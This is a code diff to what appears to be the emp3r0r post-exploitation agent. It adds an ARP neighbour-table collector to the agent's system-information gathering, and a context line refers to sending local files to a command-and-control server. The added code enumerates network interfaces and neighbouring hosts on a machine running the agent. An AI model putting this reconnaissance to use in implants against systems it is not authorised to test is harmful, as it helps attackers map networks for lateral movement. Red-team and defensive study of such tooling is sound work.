@@ -21,6 +21,7 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/tun"
 	gops "github.com/mitchellh/go-ps"
+	"github.com/vishvananda/netlink"
 	"github.com/zcalusic/sysinfo"
 )
 
@@ -188,6 +189,9 @@ func CollectSystemInfo() *SystemInfo {
 	// IP address?
 	info.IPs = collectLocalIPs()
 
+	// arp -a ?
+	info.ARP = ipNeigh()
+
 	return &info
 }
 
@@ -301,6 +305,53 @@ func collectLocalIPs() (ips []string) {
 	}
 
 	return
+}
+
+// get all interfaces
+func ipLink() (links []netlink.Link) {
+	links, err := netlink.LinkList()
+	if err != nil {
+		log.Printf("Failed to get network interfaces: %v", err)
+		return nil
+	}
+
+	return
+}
+
+func linkIdx2Name(index int) (name string) {
+	link, err := netlink.LinkByIndex(index)
+	if err != nil {
+		log.Printf("Cannot read name from interface %d: %v", index, err)
+		return "N/A"
+	}
+
+	return link.Attrs().Name
+}
+
+func ipNeigh() []string {
+	var (
+		mappings  []string
+		neighList []netlink.Neigh
+	)
+	links := ipLink()
+	if links == nil {
+		return []string{"N/A"}
+	}
+	for _, link := range links {
+		ifIdx := link.Attrs().Index
+		l, err := netlink.NeighList(ifIdx, netlink.FAMILY_ALL)
+		neighList = append(neighList, l...)
+		if err != nil {
+			log.Printf("Cannot get neigh list on interface %d: %v", ifIdx, err)
+			continue
+		}
+	}
+
+	for _, n := range neighList {
+		mappings = append(mappings, fmt.Sprintf("%s (%s)", n.IP.String(), linkIdx2Name(n.LinkIndex)))
+	}
+
+	return mappings
 }
 
 // send local file to CC
